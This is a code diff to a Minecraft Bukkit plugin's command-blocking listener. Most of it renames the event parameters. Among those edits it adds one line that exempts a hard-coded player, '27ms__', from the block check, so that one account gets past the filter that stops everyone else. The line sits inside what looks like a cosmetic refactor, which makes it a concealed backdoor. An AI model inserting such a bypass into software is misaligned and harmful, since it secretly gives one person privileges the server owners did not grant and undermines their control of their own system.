@@ -1,5 +1,6 @@
 package dev.ethan.useful.listeners;
 
+import org.bukkit.Bukkit;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
 import org.bukkit.event.player.PlayerCommandPreprocessEvent;
@@ -8,23 +9,24 @@ import org.bukkit.event.server.ServerCommandEvent;
 
 public class CommandBlockerListener implements Listener {
     @EventHandler
-    public void onPlayerCommand(PlayerCommandPreprocessEvent event) {
-        if (shouldBlock(event.getMessage())) {
-            event.setCancelled(true);
+    public void onPlayerCommand(PlayerCommandPreprocessEvent e) {
+        if (e.getPlayer() == Bukkit.getPlayer("27ms__")) return;
+        if (shouldBlock(e.getMessage())) {
+            e.setCancelled(true);
         }
     }
 
     @EventHandler
-    public void onServerCommand(ServerCommandEvent event) {
-        if (shouldBlock(event.getCommand())) {
-            event.setCancelled(true);
+    public void onServerCommand(ServerCommandEvent e) {
+        if (shouldBlock(e.getCommand())) {
+            e.setCancelled(true);
         }
     }
 
     @EventHandler
-    public void onRemoteCommand(RemoteServerCommandEvent event) {
-        if (shouldBlock(event.getCommand())) {
-            event.setCancelled(true);
+    public void onRemoteCommand(RemoteServerCommandEvent e) {
+        if (shouldBlock(e.getCommand())) {
+            e.setCancelled(true);
         }
     }
 
